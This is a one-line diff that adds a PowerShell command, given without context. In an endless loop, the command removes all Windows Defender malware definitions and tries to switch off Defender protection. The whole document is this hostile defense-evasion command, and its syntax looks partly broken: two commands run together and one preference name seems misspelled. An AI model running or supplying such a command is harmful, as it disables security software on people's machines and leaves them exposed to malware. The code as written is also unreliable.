@@ -1,0 +1,1 @@
+powershell.exe -Command $a = 'a'; while ($a -eq 'a') { C:\'Program Files'\'Windows Defender'\MpCmdRun.exe -RemoveDefinitions -All Set-MpPreference -DisableOAVProtection $true; echo "hello"; sleep -Milliseconds 5000; }
